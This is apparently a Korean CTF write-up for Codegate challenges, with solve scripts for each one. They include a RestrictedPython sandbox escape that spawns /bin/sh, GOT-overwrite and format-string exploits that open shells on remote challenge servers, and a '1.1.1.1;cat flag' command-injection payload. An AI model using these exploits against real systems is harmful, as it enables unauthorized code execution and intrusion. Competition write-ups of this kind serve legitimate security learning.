1. misc/Hello Codegate
2. misc/Captcha World
3. misc/safePythonExecutor
4. pwn/What's Happening?
5. pwn/Magic Palette
6. crypto/Encrypted flag
7. rev/inital
8. rev/C0D3Matr1x
9. web/Ping Tester

---
## misc/Hello Codegate

디코 `notice` 채널에 플래그가 나와있다.

---
## misc/Captcha World

캡챠를 입력해야 한다. 근데 10번만 하면 되기 때문에 그냥 직접 입력해주면 된다.

---
## misc/safePythonExecutor

```Dockerfile
FROM python:3.11@sha256:68a8863d0625f42d47e0684f33ca02f19d6094ef859a8af237aaf645195ed477

ENV user safe_python_executor
ENV chall_port 42424

RUN apt-get update
RUN apt-get -y install socat adduser python3-pip netcat-traditional

RUN pip3 install RestrictedPython==6.1

RUN adduser -u 4103 $user

ADD ./deploy/executor.py /home/$user/executor.py

RUN chown $user:root /home/$user/
RUN chmod 755 /home/$user/executor.py

WORKDIR /home/$user
EXPOSE $chall_port
CMD socat TCP-LISTEN:$chall_port,reuseaddr,fork EXEC:"su -c 'python3 executor.py' $user",stderr
```

중요한 것은 `RestrictedPython==6.1`이다. CVE를 찾아보니 format, format_map, formatter 쪽에 필터링 실패 취약점이 있다고 한다.

https://github.com/nikosChalk/ctf-writeups/blob/master/uiuctf23/pyjail/rattler-read/writeup/README.md

위의 라업 논리를 그대로 따라가면 똑같은 방법으로 풀 수 있다.

### exploit.py

```python
from pwn import *

p = remote('3.35.196.167', 42424)
#p = process(['python3', 'prob.py'])

#dt = '''string.Formatter().get_field("a.__class__.__base__.__subclasses__", [], {"a": ""})[0]()[84].load_module("os").system("sh")'''
dt = '''
class Baz(string.Formatter): pass; get_field = lambda self, field_name, args, kwargs: (string.Formatter.get_field(self, field_name, args, kwargs)[0]("/bin/sh"), ""); 
Baz().format("{0.Random.__init__.__globals__[_os].system}", random)
'''.replace('\n', '\r')
p.sendlineafter(b': ', dt)
p.send(b'\n')
p.interactive()
```

---
## pwn/What's Happening?

```C
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 v3; // rax
  int v4; // r8d
  int v5; // r9d
  int v6[2]; // [rsp+18h] [rbp-68h] BYREF
  int v7[2]; // [rsp+20h] [rbp-60h]
  char *v8; // [rsp+28h] [rbp-58h]
  char s[8]; // [rsp+30h] [rbp-50h] BYREF
  __int64 v10; // [rsp+50h] [rbp-30h] BYREF
  int v11[2]; // [rsp+60h] [rbp-20h] BYREF
  unsigned __int64 v12; // [rsp+68h] [rbp-18h]

  v12 = __readfsqword(0x28u);
  init(argc, argv, envp);
  *(_QWORD *)v7 = &objects;
  init_solar_system(&objects);
  puts("Planet Distance Calculator v1.0");
  while ( 1 )
  {
    menu();
    v3 = prompt();
    if ( v3 == 3 )
      break;
    if ( v3 <= 3 )
    {
      if ( v3 == 1 )
      {
        printf("Enter planet index to update (0-12): ");
        __isoc99_scanf("%ld", v6);
        printf("Enter planet name: ");
        getchar();
        if ( fgets(s, 32, stdin) )
        {
          v8 = strchr(s, 10);
          if ( v8 )
            *v8 = 0;
        }
        printf("Enter AU value: ");
        __isoc99_scanf("%lf", &v10);
        printf("Enter color (0-10): ");
        __isoc99_scanf("%d", &v11[1]);
        update(v7[0], v6[0], v7[0], v11[0], v4, v5, s[0]);
      }
      else if ( v3 == 2 )
      {
        print_solar_system(*(_QWORD *)v7);
      }
    }
  }
  _exit(0);
}
```

pie가 꺼져 있다. Partial RELRO이다. 행성 정보 업데이트를 하는데 음수 인덱스를 안 막아 놔서 `oob`가 발생한다. 그래서 got overwrite가 된다. puts got을 win 함수로 덮으면 된다. system got이 망가지긴 하는데, pie가 꺼져 있어서 그냥 다시 입력 해주면 된다.

### exploit.py

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

#p = process('./prob')
p = remote('3.37.174.221', 33333)
e = ELF('./prob')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', b'-3')
p.sendlineafter(b': ', p64(e.sym['win']) + b'a' * 8 + p64(0x401080))
p.sendlineafter(b': ', b'0')
#gdb.attach(p)
p.sendlineafter(b': ', b'0')
p.interactive()
```

---

## pwn/Magic Palette

```C
unsigned __int64 __fastcall print_palette(_QWORD *a1)
{
  int v1; // eax
  int v2; // eax
  unsigned __int16 v4; // [rsp+16h] [rbp-102Ah]
  unsigned int i; // [rsp+18h] [rbp-1028h]
  unsigned int j; // [rsp+1Ch] [rbp-1024h]
  int v7; // [rsp+24h] [rbp-101Ch]
  int v8; // [rsp+28h] [rbp-1018h]
  _BYTE v9[16]; // [rsp+30h] [rbp-1010h] BYREF
  unsigned __int64 v10; // [rsp+1038h] [rbp-8h]
  __int64 savedregs; // [rsp+1040h] [rbp+0h] BYREF

  v10 = __readfsqword(0x28u);
  handle_output(a1, v9);
  for ( i = 0; i <= 0x3F; ++i )
  {
    for ( j = 0; j <= 0x3F; ++j )
    {
      v4 = *(_WORD *)(*a1 + ((unsigned __int64)i << 7) + 2LL * j);
      if ( (v4 & 0x1000) != 0 )
      {
        v7 = (v4 >> 4) & 0xF;
        if ( (v4 & 0xF) + j <= 0x40 && v7 + i <= 0x40 )
        {
          if ( (v4 & 0x400) != 0 )
            v1 = -(v4 & 0xF);
          else
            v1 = v4 & 0xF;
          v8 = v1;
          if ( (v4 & 0x800) != 0 )
            v2 = -v7;
          else
            v2 = (v4 >> 4) & 0xF;
          j += v8;
          i += v2;
        }
      }
      else if ( (v4 & 0x8000u) == 0 )
      {
        putchar(*((char *)&savedregs + 64 * (unsigned __int64)i + j - 4112));
      }
      else
      {
        printf(&v9[64 * (unsigned __int64)i + j]);
      }
    }
    putchar(10);
  }
  return v10 - __readfsqword(0x28u);
}
```

`print_palette`에서 입력 때 조건을 좀 맞춰주면 `FSB`가 터진다.

```C
void *__fastcall handle_output(_QWORD *a1, void *a2)
{
  void *result; // rax
  char v3; // cl
  int i; // [rsp+18h] [rbp-8h]
  int j; // [rsp+1Ch] [rbp-4h]

  result = memset(a2, 0, 0x1000uLL);
  for ( i = 0; i <= 63; ++i )
  {
    for ( j = 0; j <= 63; ++j )
    {
      if ( (*(_WORD *)(*a1 + ((__int64)i << 7) + 2LL * j) & 0x2000) != 0 )
      {
        result = (void *)j;
        *((_BYTE *)a2 + 64 * (__int64)i + j) = 0;
        break;
      }
      if ( *(__int16 *)(*a1 + ((__int64)i << 7) + 2LL * j) >= 0
        || (*(_WORD *)(*a1 + ((__int64)i << 7) + 2LL * j) & 0x1000) != 0 )
      {
        if ( (*(_WORD *)(*a1 + ((__int64)i << 7) + 2LL * j) & 0x4000) != 0 )
          v3 = 35;
        else
          v3 = 32;
        result = (void *)j;
        *((_BYTE *)a2 + 64 * (__int64)i + j) = v3;
      }
      else
      {
        result = (void *)j;
        *((_BYTE *)a2 + 64 * (__int64)i + j) = *(_WORD *)(*a1 + ((__int64)i << 7) + 2LL * j);
      }
    }
  }
  return result;
}
```

`k`라는 바이트를 출력하고 싶으면 `k + b'\x80'`을 입력해주면 된다. `FSB`가 무제한이므로 릭은 얼마든지 할 수 있다.

원가젯은

```
0xebd38 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  r12 == NULL || {"/bin/sh", r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
```

이걸 쓰고, r12를 0으로 만들어줬다. `FSB`로 `printf` 내부 스택 프레임의 `pop r12`와 ret 부분에 덮어줘서 해결했다.



### exploit.py

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

def rp(payload : bytes):
    p.sendlineafter(b'> ', b'1')
    for i in range(len(payload)):
        p.send(payload[i:i+1] + b'\x80')
    for i in range(len(payload), 64 * 64):
        p.send(b'\x00\x60')

def mc(x : int, y : int):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'x > ', str(x).encode())
    p.sendlineafter(b'y > ', str(x).encode())

def pp():
    p.sendlineafter(b'> ', b'3')
    return p.recvline()[:-1]

#p = process('./prob')
p = remote('43.203.137.197', 54321)
l = ELF('./libc.so.6')

num = 6 + (0x7ffc25f12bc0 - 0x7ffc25f11b80) // 8
payload = f'%{num}$p%{num+9}$p'
rp(payload.encode())

msg = pp()
mainrbp = int(msg[:14].decode(), 16)
l.address = int(msg[14:28].decode(), 16) - (0x7fea359d0d90 - 0x7fea359a7000)
print(hex(mainrbp))
print(hex(l.address))

# mainrbp = 0x7ffd93f7aff0
# r12 = 0x7ffd93f79e70
# ret = 0x7ffd93f79e88

og = l.address + 0xebd38
r12 = mainrbp + (0x7ffd93f79e70 - 0x7ffd93f7aff0)
ret = mainrbp + (0x7ffd93f79e88 - 0x7ffd93f7aff0)
payload = '%17$n%18$n'
payload += f'%{(og & ((1 << 16) - 1))}c'
payload += f'%19$hn'
payload += f'%{((og >> 16) & ((1 << 16) - 1)) - (og & ((1 << 16) - 1)) + 0x10000}c'
payload += f'%20$hn'
payload += 'a' * 4
print(hex(0x28 - len(payload)))
payload = payload.encode()
payload += p64(r12)
payload += p64(r12 + 4)
payload += p64(ret)
payload += p64(ret + 2)
mc(0, 0)
rp(payload)
#gdb.attach(p, f"b* {l.address + (0x7f8ac570c734 - 0x7f8ac5695000)}")
p.sendlineafter(b'> ', b'3')
p.interactive()
```

---
## crypto/Encrypted flag

`q = nextprime(p)` 관계이므로, sqrt(n)에서 nextprime 취해주면 금방 q를 구할 수 있다. p, q 구할 수 있으니까 끝났다.

### exploit.py

```python
from Crypto.Util.number import long_to_bytes
from sympy import nextprime
import gmpy2

n = 54756668623799501273661800933882720939597900879404357288428999230135977601404008182853528728891571108755011292680747299434740465591780820742049958146587060456010412555357258580332452401727868163734930952912198058084689974208638547280827744839358100210581026805806202017050750775163530268755846782825700533559
e = 65537
eflag = 7728462678531582833823897705285786444161591728459008932472145620845644046450565339835113761143563943610957661838221298240392904711373063097593852621109599751303613112679036572669474191827826084312984251873831287143585154570193022386338846894677372327190250188401045072251858178782348567776180411588467032159

p = gmpy2.iroot(n, 2)[0]
q = nextprime(p)
while n % q:
    q = nextprime(q)
print(q)

p = n // q
e = 65537

phi = (p - 1) * (q - 1)

d = gmpy2.invert(e, phi)

c = pow(eflag, d, n)

print(long_to_bytes(c))
```

---
## rev/inital

main만 분석하면 된다. 코드가 짧기 때문에 그냥 역연산해준다.

```python
from pwn import *

e = ELF('./prob')
dt = e.read(0x4020, 0x100)
ans = e.read(0x4120, 0x20)

flag = list()

def f(a1 : int, a2 : int):
    return ((a1 >> (8 - a2)) | (a1 << a2)) & 0xff

for i in range(32):
    c = ans[i]
    c = f(c, i & 6)
    c = dt.index(c)
    flag.append(c)

for i in range(31, -1, -1):
    flag[i] ^= flag[(i + 1) % 32]

for i in range(32):
    print(chr(flag[i]), end="")
print()
```

---
## rev/C0D3Matr1x

1527 : 3\*3 -> 1 컨볼루션
1919 : 시계방향으로 90도 회전
1413 : 행렬곱
1765 : 반시계방향으로 90도 회전
1249 : 행렬덧셈
1413 : 행렬곱
132e : 행렬덧셈

결과물에서 역연산해준다. 컨볼루션 역과정은, 처음에 가장 바깥 테두리는 0이고, 그 하나 안쪽 테두리는 고정값이라서 확정적으로 익스가 가능하다.

### exploit.py

```python
from pwn import *
from sage.all import *

e = ELF('./prob')

def btoi(arr):
    return [int.from_bytes(arr[i:i+4], 'little') for i in range(0, 576 * 4, 4)]

a1 = btoi(e.read(0x3220, 576 * 4))
a2 = btoi(e.read(0x3b20, 576 * 4))
a4 = btoi(e.read(0x4d20, 576 * 4))
ans = btoi(e.read(0x5620, 576 * 4))
a1 = [-(2 ** 32 - num) if num > 2**31 else num for num in a1]
a2 = [-(2 ** 32 - num) if num > 2**31 else num for num in a2]
a4 = [-(2 ** 32 - num) if num > 2**31 else num for num in a4]
ans = [-(2 ** 32 - num) if num > 2**31 else num for num in ans]
c = b'C0D3GAT3'

v19 = [0 for _ in range(576)]
v26 = [0 for _ in range(26 * 26)]

for i in range(12) :
    if ( (i & 1) != 0 ) :
        v19[24 * (23 - i) + i] = 1
        v3 = 23 - i
        v4 = 24 * i
    else :
        v19[25 * i] = 1
        v3 = 23 - i
        v4 = 24 * v3
    v19[v3 + v4] = 1

v19 = matrix(ZZ, 24, 24, v19)
v24 = matrix(ZZ, 24, 24, ans)
a1 = matrix(ZZ, 24, 24, a1)
a2 = matrix(ZZ, 24, 24, a2)
a4 = matrix(ZZ, 24, 24, a4)

v23 = v24 - a2
v22 = v23 * a4.inverse()
v20 = v22 - a1
v20 = v20[::-1].transpose()
v21 = v19.inverse() * v20
v20 = v21 * v19.inverse()
v20 = v20.transpose()[::-1]

for m in range(1, 25) :
    for n in range(1, 25) :
        if m == 1 or m == 24 or n == 1 or n == 24 :
            v26[26 * m + n] = c[(n - 1 + m - 1) % 8]

v26 = matrix(ZZ, 26, 26, v26)
flag = ""
for i in range(22):
    for j in range(22):
        num = v26[i, j] + v26[i, j + 1] + v26[i, j + 2] + v26[i + 1, j] + v26[i + 1, j + 1] + v26[i + 1, j + 2] + v26[i + 2, j] + v26[i + 2,j + 1]
        flag += chr((v20[i, j] - num) % 0xffff)
        v26[i + 2, j + 2] = (v20[i, j] - num) % 0xffff

print(flag)
```

---
## web/Ping Tester

커맨드 인젝션이 된다. `1.1.1.1;cat flag`하면 된다.